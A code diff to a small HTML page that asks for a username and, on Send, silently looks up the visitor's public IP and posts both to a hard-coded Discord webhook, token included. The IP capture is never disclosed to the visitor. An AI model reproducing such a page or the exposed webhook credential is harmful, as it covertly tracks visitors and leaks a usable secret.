@@ -5,19 +5,51 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Send Textbox Content</title>
     <style>
+        body {
+            background-image: url('https://xyzzr.github.io/-/image.png');
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+        }
         #inputBox {
             border: 1px solid #ccc;
             padding: 10px;
             width: 300px;
+            background-color: black;
+            color: white;
+            border-radius: 5px;
         }
         #inputBox.green-border {
             border-color: green;
         }
+        #sendButton {
+            margin-top: 10px;
+            padding: 10px 20px;
+            background-color: black;
+            color: white;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        #sendButton:hover {
+            background-color: #333;
+        }
     </style>
 </head>
 <body>
-    <input type="text" id="inputBox" placeholder="Type username here...">
-    <button id="sendButton">Send</button>
+    <div class="container">
+        <input type="text" id="inputBox" placeholder="Type username here...">
+        <button id="sendButton">Send</button>
+    </div>
 
     <script>
         document.getElementById('inputBox').addEventListener('input', function() {
@@ -31,19 +63,17 @@
         document.getElementById('sendButton').addEventListener('click', function() {
             var content = document.getElementById('inputBox').value.trim();
             if (content === "") {
-                alert("please enter your username.");
+                alert("Please enter your username.");
                 return;
             }
 
-
-            fetch('https://api.ipify.org?format=json') // amm
+            fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     var userIp = data.ip;
                     var payload = {
                         content: `Textbox content: ${content}\nUser IP: ${userIp}`
                     };
-
 
                     fetch('https://discord.com/api/webhooks/1264345023491735612/PhNW10WDYOLVaEC2fehza-FVDP8rw22i20wDEvhOc31P_JxfG7kAX8BXUI9Z6wfc4rYE', {
                         method: 'POST',
@@ -53,17 +83,17 @@
                         body: JSON.stringify(payload)
                     }).then(response => {
                         if (response.ok) {
-                            alert("content sent successfully!");
+                            alert("Content sent successfully!");
                         } else {
-                            alert("failed to send content.");
+                            alert("Failed to send content.");
                         }
                     }).catch(error => {
                         console.error('Error:', error);
-                        alert("failed to send content.");
+                        alert("Failed to send content.");
                     });
                 }).catch(error => {
                     console.error('Error fetching IP:', error);
-                    alert("fail");
+                    alert("Failed to retrieve IP address.");
                 });
         });
     </script>
